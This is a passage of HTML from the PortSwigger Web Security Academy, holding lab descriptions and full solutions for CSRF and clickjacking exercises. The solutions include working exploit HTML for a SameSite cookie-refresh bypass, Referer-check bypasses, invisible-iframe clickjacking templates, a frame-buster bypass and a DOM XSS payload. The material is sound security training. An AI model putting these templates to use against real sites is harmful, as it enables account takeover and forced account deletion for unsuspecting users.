                    href="https://portswigger.net/academy/labs/launch/45d14a50b45f44eb45dfc4a06b898d985a5bace7f1c3f943697338608838388e?referrer=%2fweb-security%2fcsrf%2fbypassing-samesite-restrictions%2flab-samesite-strict-bypass-via-cookie-refresh"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <h5>
                                Study the change email function
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        In Burp's browser, log in via your social media account and change your email
                                        address.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Burp, go to the
                                        <strong>
                                            Proxy &gt; HTTP history
                                        </strong>
                                        tab.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Study the
                                        <code>
         POST /my-account/change-email
        </code>
                                        request and notice that this doesn't contain any unpredictable tokens, so may be
                                        vulnerable to CSRF if you can bypass any SameSite cookie restrictions.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Look at the response to the
                                        <code>
         GET /oauth-callback?code=[...]
        </code>
                                        request at the end of the
                                        <a href="https://portswigger.net/web-security/oauth">
                                            OAuth
                                        </a>
                                        flow. Notice that the website doesn't explicitly specify any SameSite
                                        restrictions when setting session cookies. As a result, the browser will use the
                                        default
                                        <code>
         Lax
        </code>
                                        restriction level.
                                    </p>
                                </li>
                            </ol>
                            <h5>
                                Attempt a
                                <a href="https://portswigger.net/web-security/csrf">
                                    CSRF attack
                                </a>
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        In the browser, go to the exploit server.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Use the following template to create a basic CSRF attack for changing the
                                        victim's email address:
                                    </p>
                                    <code class="code-scrollable">
        &lt;script&gt;
    history.pushState('', '', '/')
&lt;/script&gt;
&lt;form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST"&gt;
    &lt;input type="hidden" name="email" value="foo@bar.com" /&gt;
    &lt;input type="submit" value="Submit request" /&gt;
&lt;/form&gt;
&lt;script&gt;
    document.forms[0].submit();
&lt;/script&gt;
       </code>
                                </li>
                                <li>
                                    <p>
                                        Store and view the exploit yourself. What happens next depends on how much time
                                        has elapsed since you logged in:
                                    </p>
                                    <ul>
                                        <li>
                                            <p>
                                                If it has been longer than two minutes, you will be logged in via the
                                                OAuth flow, and the attack will fail. In this case, repeat this step
                                                immediately.
                                            </p>
                                        </li>
                                        <li>
                                            <p>
                                                If you logged in less than two minutes ago, the attack is successful and
                                                your email address is changed. From the
                                                <strong>
                                                    Proxy &gt; HTTP history
                                                </strong>
                                                tab, find the
                                                <code>
           POST /my-account/change-email
          </code>
                                                request and confirm that your session cookie was included even though
                                                this is a cross-site
                                                <code>
           POST
          </code>
                                                request.
                                            </p>
                                        </li>
                                    </ul>
                                </li>
                            </ol>
                            <h5>
                                Bypass the SameSite restrictions
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        In the browser, notice that if you visit
                                        <code>
         /social-login
        </code>
                                        , this automatically initiates the full OAuth flow. If you still have a
                                        logged-in session with the OAuth server, this all happens without any
                                        interaction.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        From the proxy history, notice that every time you complete the OAuth flow, the
                                        target site sets a new session cookie even if you were already logged in.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Go back to the exploit server.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Change the JavaScript so that the attack first refreshes the victim's session by
                                        forcing their browser to visit
                                        <code>
         /social-login
        </code>
                                        , then submits the email change request after a short pause. The following is
                                        one possible approach:
                                    </p>
                                    <code class="code-scrollable">
        &lt;form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"&gt;
    &lt;input type="hidden" name="email" value="pwned@web-security-academy.net"&gt;
&lt;/form&gt;
&lt;script&gt;
    window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
    setTimeout(changeEmail, 5000);

    function changeEmail(){
        document.forms[0].submit();
    }
&lt;/script&gt;
       </code>
                                    <p>
                                        Note that we've opened the
                                        <code>
         /social-login
        </code>
                                        in a new window to avoid navigating away from the exploit before the change
                                        email request is sent.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Store and view the exploit yourself. Observe that the initial request gets
                                        blocked by the browser's popup blocker.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Observe that, after a pause, the CSRF attack is still launched. However, this is
                                        only successful if it has been less than two minutes since your cookie was set.
                                        If not, the attack fails because the popup blocker prevents the forced cookie
                                        refresh.
                                    </p>
                                </li>
                            </ol>
                            <h5>
                                Bypass the popup blocker
                            </h5>
                            <ol>
                                <li>
                                    <p>
                                        Realize that the popup is being blocked because you haven't manually interacted
                                        with the page.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Tweak the exploit so that it induces the victim to click on the page and only
                                        opens the popup once the user has clicked. The following is one possible
                                        approach:
                                    </p>
                                    <code class="code-scrollable">
        &lt;form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"&gt;
    &lt;input type="hidden" name="email" value="pwned@portswigger.net"&gt;
&lt;/form&gt;
&lt;p&gt;Click anywhere on the page&lt;/p&gt;
&lt;script&gt;
    window.onclick = () =&gt; {
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
&lt;/script&gt;
       </code>
                                </li>
                                <li>
                                    <p>
                                        Test the attack on yourself again while monitoring the proxy history in Burp.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        When prompted, click the page. This triggers the OAuth flow and issues you a new
                                        session cookie. After 5 seconds, notice that the CSRF attack is sent and the
                                        <code>
         POST /my-account/change-email
        </code>
                                        request includes your new session cookie.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Go to your account page and confirm that your email address has changed.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Change the email address in your exploit so that it doesn't match your own.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Deliver the exploit to the victim to solve the lab.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: CSRF where Referer validation depends on header being present
                (csrf)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests
                but has an insecure fallback.
            </p>
            <p>
                To solve the lab, use your exploit server to host an HTML page that uses a
                <a href="https://portswigger.net/web-security/csrf">
                    CSRF attack
                </a>
                to change the viewer's email address.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                You cannot register an email address that is already taken by another user. If you
                                change your own email address while testing your exploit, make sure you use a different
                                email address for the final exploit you deliver to the victim.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/827802fa22cc24000bb63cd4a2787ba5076b3c9727323ea512dc392ba98842b8?referrer=%2fweb-security%2fcsrf%2fbypassing-referer-based-defenses%2flab-referer-validation-depends-on-header-being-present"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Open Burp's browser and log in to your account. Submit the "Update email" form, and
                                    find the resulting request in your Proxy history.
                                </li>
                                <li>
                                    Send the request to Burp Repeater and observe that if you change the domain in the
                                    Referer HTTP header then the request is rejected.
                                </li>
                                <li>
                                    Delete the Referer header entirely and observe that the request is now accepted.
                                </li>
                                <li>
                                    <p>
                                        Create and host a proof of concept exploit as described in the solution to the
                                        <a href="https://portswigger.net/web-security/csrf/lab-no-defenses">
                                            CSRF vulnerability with no defenses
                                        </a>
                                        lab. Include the following HTML to suppress the Referer header:
                                    </p>
                                    <code class="code-scrollable">
        &lt;meta name="referrer" content="no-referrer"&gt;
       </code>
                                </li>
                                <li>
                                    Change the email address in your exploit so that it doesn't match your own.
                                </li>
                                <li>
                                    Store the exploit, then click "Deliver to victim" to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: CSRF with broken Referer validation
                (csrf)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab's email change functionality is vulnerable to CSRF. It attempts to detect and block cross
                domain requests, but the detection mechanism can be bypassed.
            </p>
            <p>
                To solve the lab, use your exploit server to host an HTML page that uses a
                <a href="https://portswigger.net/web-security/csrf">
                    CSRF attack
                </a>
                to change the viewer's email address.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                You cannot register an email address that is already taken by another user. If you
                                change your own email address while testing your exploit, make sure you use a different
                                email address for the final exploit you deliver to the victim.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/16d017d6cc0162f41ea71950a84e47e8a8b7914d65e26f917ea8fd2366287791?referrer=%2fweb-security%2fcsrf%2fbypassing-referer-based-defenses%2flab-referer-validation-broken"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Open Burp's browser and log in to your account. Submit the "Update email" form, and
                                    find the resulting request in your Proxy history.
                                </li>
                                <li>
                                    Send the request to Burp Repeater. Observe that if you change the domain in the
                                    Referer HTTP header, the request is rejected.
                                </li>
                                <li>
                                    <p>
                                        Copy the original domain of your lab instance and append it to the Referer
                                        header in the form of a query string. The result should look something like
                                        this:
                                    </p>
                                    <code class="code-scrollable">
        Referer: https://arbitrary-incorrect-domain.net?YOUR-LAB-ID.web-security-academy.net
       </code>
                                </li>
                                <li>
                                    Send the request and observe that it is now accepted. The website seems to accept
                                    any Referer header as long as it contains the expected domain somewhere in the
                                    string.
                                </li>
                                <li>
                                    <p>
                                        Create a CSRF proof of concept exploit as described in the solution to the
                                        <a href="https://portswigger.net/web-security/csrf/lab-no-defenses">
                                            CSRF vulnerability with no defenses
                                        </a>
                                        lab and host it on the exploit server. Edit the JavaScript so that the third
                                        argument of the
                                        <code>
         history.pushState()
        </code>
                                        function includes a query string with your lab instance URL as follows:
                                    </p>
                                    <code class="code-scrollable">
        history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")
       </code>
                                    <p>
                                        This will cause the Referer header in the generated request to contain the URL
                                        of the target site in the query string, just like we tested earlier.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        If you store the exploit and test it by clicking "View exploit", you may
                                        encounter the "invalid Referer header" error again. This is because many
                                        browsers now strip the query string from the Referer header by default as a
                                        security measure. To override this behavior and ensure that the full URL is
                                        included in the request, go back to the exploit server and add the following
                                        header to the "Head" section:
                                    </p>
                                    <code class="code-scrollable">
        Referrer-Policy: unsafe-url
       </code>
                                    <p>
                                        Note that unlike the normal Referer header, the word "referrer" must be spelled
                                        correctly in this case.
                                    </p>
                                </li>
                                <li>
                                    Change the email address in your exploit so that it doesn't match your own.
                                </li>
                                <li>
                                    Store the exploit, then click "Deliver to victim" to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Basic
                <a href="https://portswigger.net/web-security/clickjacking">
                    clickjacking
                </a>
                with CSRF token protection
                (clickjacking)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab contains login functionality and a delete account button that is protected by a
                <a href="https://portswigger.net/web-security/csrf">
                    CSRF
                </a>
                token. A user will click on elements that display the word "click" on a decoy website.
            </p>
            <p>
                To solve the lab, craft some HTML that frames the account page and fools the user into deleting their
                account. The lab is solved when the account is deleted.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    The victim will be using Chrome so test your exploit on that browser.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/ccfdc81094e272982bb5995e349d1fee4cb10179392ed6b49586fed5837006a0?referrer=%2fweb-security%2fclickjacking%2flab-basic-csrf-protected"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Log in to your account on the target website.
                                </li>
                                <li>
                                    <p>
                                        Go to the exploit server and paste the following HTML template into the
                                        <strong>
                                            Body
                                        </strong>
                                        section:
                                    </p>
                                    <code class="code-scrollable">
        &lt;style&gt;
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
&lt;/style&gt;
&lt;div&gt;Test me&lt;/div&gt;
&lt;iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"&gt;&lt;/iframe&gt;
       </code>
                                </li>
                                <li>
                                    Make the following adjustments to the template:
                                    <ul>
                                        <li>
                                            Replace
                                            <code>
          YOUR-LAB-ID
         </code>
                                            in the iframe
                                            <code>
          src
         </code>
                                            attribute with your unique lab ID.
                                        </li>
                                        <li>
                                            Substitute suitable pixel values for the
                                            <code>
          $height_value
         </code>
                                            and
                                            <code>
          $width_value
         </code>
                                            variables of the iframe (we suggest 700px and 500px respectively).
                                        </li>
                                        <li>
                                            Substitute suitable pixel values for the
                                            <code>
          $top_value
         </code>
                                            and
                                            <code>
          $side_value
         </code>
                                            variables of the decoy web content so that the "Delete account" button and
                                            the "Test me" decoy action align (we suggest 300px and 60px respectively).
                                        </li>
                                        <li>
                                            Set the opacity value
                                            <code>
          $opacity
         </code>
                                            to ensure that the target iframe is transparent. Initially, use an opacity
                                            of 0.1 so that you can align the iframe actions and adjust the position
                                            values as necessary. For the submitted attack a value of 0.0001 will work.
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    Click
                                    <strong>
                                        Store
                                    </strong>
                                    and then
                                    <strong>
                                        View exploit
                                    </strong>
                                    .
                                </li>
                                <li>
                                    Hover over
                                    <strong>
                                        Test me
                                    </strong>
                                    and ensure the cursor changes to a hand indicating that the div element is
                                    positioned correctly.
                                    <strong>
                                        Do not actually click the "Delete account" button yourself.
                                    </strong>
                                    If you do, the lab will be broken and you will need to wait until it resets to try
                                    again (about 20 minutes). If the div does not line up properly, adjust the
                                    <code>
        top
       </code>
                                    and
                                    <code>
        left
       </code>
                                    properties of the style sheet.
                                </li>
                                <li>
                                    Once you have the div element lined up correctly, change "Test me" to "Click me" and
                                    click
                                    <strong>
                                        Store
                                    </strong>
                                    .
                                </li>
                                <li>
                                    Click on
                                    <strong>
                                        Deliver exploit to victim
                                    </strong>
                                    and the lab should be solved.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Clickjacking with form input data prefilled from a URL parameter
                (clickjacking)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab extends the basic
                <a href="https://portswigger.net/web-security/clickjacking">
                    clickjacking example
                </a>
                in
                <a href="https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected">
                    Lab: Basic clickjacking with CSRF token protection
                </a>
                . The goal of the lab is to change the email address of the user by prepopulating a form using a URL
                parameter and enticing the user to inadvertently click on an "Update email" button.
            </p>
            <p>
                To solve the lab, craft some HTML that frames the account page and fools the user into updating their
                email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    The victim will be using Chrome so test your exploit on that browser.
                </p>
            </div>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                You cannot register an email address that is already taken by another user. If you
                                change your own email address while testing your exploit, make sure you use a different
                                email address for the final exploit you deliver to the victim.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2fweb-security%2fclickjacking%2flab-prefilled-form-input"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Log in to the account on the target website.
                                </li>
                                <li>
                                    <p>
                                        Go to the exploit server and paste the following HTML template into the "Body"
                                        section:
                                    </p>
                                    <code class="code-scrollable">
        &lt;style&gt;
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
&lt;/style&gt;
&lt;div&gt;Test me&lt;/div&gt;
&lt;iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"&gt;&lt;/iframe&gt;
       </code>
                                </li>
                                <li>
                                    Make the following adjustments to the template:
                                    <ul>
                                        <li>
                                            Replace
                                            <code>
          YOUR-LAB-ID
         </code>
                                            with your unique lab ID so that the URL points to the target website's user
                                            account page, which contains the "Update email" form.
                                        </li>
                                        <li>
                                            Substitute suitable pixel values for the
                                            <code>
          $height_value
         </code>
                                            and
                                            <code>
          $width_value
         </code>
                                            variables of the iframe (we suggest 700px and 500px respectively).
                                        </li>
                                        <li>
                                            Substitute suitable pixel values for the
                                            <code>
          $top_value
         </code>
                                            and
                                            <code>
          $side_value
         </code>
                                            variables of the decoy web content so that the "Update email" button and the
                                            "Test me" decoy action align (we suggest 400px and 80px respectively).
                                        </li>
                                        <li>
                                            Set the opacity value
                                            <code>
          $opacity
         </code>
                                            to ensure that the target iframe is transparent. Initially, use an opacity
                                            of 0.1 so that you can align the iframe actions and adjust the position
                                            values as necessary. For the submitted attack a value of 0.0001 will work.
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    Click
                                    <strong>
                                        Store
                                    </strong>
                                    and then
                                    <strong>
                                        View exploit
                                    </strong>
                                    .
                                </li>
                                <li>
                                    Hover over "Test me" and ensure the cursor changes to a hand indicating that the div
                                    element is positioned correctly. If not, adjust the position of the div element by
                                    modifying the top and left properties of the style sheet.
                                </li>
                                <li>
                                    Once you have the div element lined up correctly, change "Test me" to "Click me" and
                                    click
                                    <strong>
                                        Store
                                    </strong>
                                    .
                                </li>
                                <li>
                                    Change the email address in your exploit so that it doesn't match your own.
                                </li>
                                <li>
                                    Deliver the exploit to the victim to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Clickjacking with a frame buster script
                (clickjacking)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab is protected by a frame buster which prevents the website from being framed. Can you get around
                the frame buster and conduct a
                <a href="https://portswigger.net/web-security/clickjacking">
                    clickjacking attack
                </a>
                that changes the users email address?
            </p>
            <p>
                To solve the lab, craft some HTML that frames the account page and fools the user into changing their
                email address by clicking on "Click me". The lab is solved when the email address is changed.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    The victim will be using Chrome so test your exploit on that browser.
                </p>
            </div>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                You cannot register an email address that is already taken by another user. If you
                                change your own email address while testing your exploit, make sure you use a different
                                email address for the final exploit you deliver to the victim.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/71c2bcc46f11be8e063fa976c68b2383fb1dfd04c1be432086d3f030159f15ae?referrer=%2fweb-security%2fclickjacking%2flab-frame-buster-script"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Log in to the account on the target website.
                                </li>
                                <li>
                                    <p>
                                        Go to the exploit server and paste the following HTML template into the "Body"
                                        section:
                                    </p>
                                    <code class="code-scrollable">
        &lt;style&gt;
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
&lt;/style&gt;
&lt;div&gt;Test me&lt;/div&gt;
&lt;iframe sandbox="allow-forms"
src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"&gt;&lt;/iframe&gt;
       </code>
                                </li>
                                <li>
                                    Make the following adjustments to the template:
                                    <ul>
                                        <li>
                                            Replace
                                            <code>
          YOUR-LAB-ID
         </code>
                                            in the iframe
                                            <code>
          src
         </code>
                                            attribute with your unique lab ID so that the URL of the target website's
                                            user account page, which contains the "Update email" form.
                                        </li>
                                        <li>
                                            Substitute suitable pixel values for the $height_value and $width_value
                                            variables of the iframe (we suggest 700px and 500px respectively).
                                        </li>
                                        <li>
                                            Substitute suitable pixel values for the $top_value and $side_value
                                            variables of the decoy web content so that the "Update email" button and the
                                            "Test me" decoy action align (we suggest 385px and 80px respectively).
                                        </li>
                                        <li>
                                            Set the opacity value
                                            <code>
          $opacity
         </code>
                                            to ensure that the target iframe is transparent. Initially, use an opacity
                                            of 0.1 so that you can align the iframe actions and adjust the position
                                            values as necessary. For the submitted attack a value of 0.0001 will work.
                                        </li>
                                    </ul>
                                    Notice the use of the
                                    <code>
        sandbox="allow-forms"
       </code>
                                    attribute that neutralizes the frame buster script.
                                </li>
                                <li>
                                    Click
                                    <strong>
                                        Store
                                    </strong>
                                    and then
                                    <strong>
                                        View exploit
                                    </strong>
                                    .
                                </li>
                                <li>
                                    Hover over "Test me" and ensure the cursor changes to a hand indicating that the div
                                    element is positioned correctly. If not, adjust the position of the div element by
                                    modifying the top and left properties of the style sheet.
                                </li>
                                <li>
                                    Once you have the div element lined up correctly, change "Test me" to "Click me" and
                                    click
                                    <strong>
                                        Store
                                    </strong>
                                    .
                                </li>
                                <li>
                                    Change the email address in your exploit so that it doesn't match your own.
                                </li>
                                <li>
                                    Deliver the exploit to the victim to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Exploiting clickjacking vulnerability to trigger
                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">
                    DOM-based XSS
                </a>
                (clickjacking)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains an
                <a href="https://portswigger.net/web-security/cross-site-scripting">
                    XSS
                </a>
                vulnerability that is triggered by a click. Construct a
                <a href="https://portswigger.net/web-security/clickjacking">
                    clickjacking attack
                </a>
                that fools the user into clicking the "Click me" button to call the
                <code>
   print()
  </code>
                function.
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    The victim will be using Chrome so test your exploit on that browser.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/d259e02fbd358d4b88e4de6938c6bcd31a3c35a7ba4fc54fa4352a3822990f24?referrer=%2fweb-security%2fclickjacking%2flab-exploiting-to-trigger-dom-based-xss"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    <p>
                                        Go to the exploit server and paste the following HTML template into the
                                        <strong>
                                            Body
                                        </strong>
                                        section:
                                    </p>
                                    <code class="code-scrollable">
        &lt;style&gt;
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
	div {
		position:absolute;
		top:$top_value;
		left:$side_value;
		z-index: 1;
	}
&lt;/style&gt;
&lt;div&gt;Test me&lt;/div&gt;
&lt;iframe
src="YOUR-LAB-ID.web-security-academy.net/feedback?name=&lt;img src=1 onerror=print()&gt;&amp;email=hacker@attacker-website.com&amp;subject=test&amp;message=test#feedbackResult"&gt;&lt;/iframe&gt;
       </code>
                                </li>
                                <li>
                                    Make the following adjustments to the template:
                                    <ul>
                                        <li>
                                            Replace
                                            <code>
          YOUR-LAB-ID
         </code>
                                            in the iframe
                                            <code>
          src
         </code>
                                            attribute with your unique lab ID so that the URL points to the target
                                            website's "Submit feedback" page.
                                        </li>
                                        <li>
                                            Substitute suitable pixel values for the $height_value and $width_value
                                            variables of the iframe (we suggest 700px and 500px respectively).
                                        </li>
                                        <li>
                                            Substitute suitable pixel values for the $top_value and $side_value
                                            variables of the decoy web content so that the "Submit feedback" button and
                                            the "Test me" decoy action align (we suggest 610px and 80px respectively).
                                        </li>
                                        <li>
                                            Set the opacity value
                                            <code>
          $opacity
         </code>
                                            to ensure that the target iframe is transparent. Initially, use an opacity
                                            of 0.1 so that you can align the iframe actions and adjust the position
                                            values as necessary. For the submitted attack a value of 0.0001 will work.
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    Click
                                    <strong>
                                        Store
                                    </strong>
                                    and then
                                    <strong>
                                        View exploit
                                    </strong>
                                    .
                                </li>
                                <li>
                                    Hover over "Test me" and ensure the cursor changes to a hand indicating that the div
                                    element is positioned correctly. If not, adjust the position of the div element by
                                    modifying the top and left properties of the style sheet.
                                </li>
                                <li>
                                    Click
                                    <strong>
                                        Test me
                                    </strong>
                                    . The print dialog should open.
                                </li>
                                <li>
                                    Change "Test me" to "Click me" and click
                                    <strong>
                                        Store
                                    </strong>
                                    on the exploit server.
                                </li>
                                <li>
                                    Now click on
                                    <strong>
                                        Deliver exploit to victim
                                    </strong>
                                    and the lab should be solved.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Multistep clickjacking
                (clickjacking)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab has some account functionality that is protected by a
                <a href="https://portswigger.net/web-security/csrf">
                    CSRF
                </a>
                token and also has a confirmation dialog to protect against
                <a href="https://portswigger.net/web-security/clickjacking">
                    Clickjacking
                </a>
                . To solve this lab construct an attack that fools the user into clicking the delete account button and
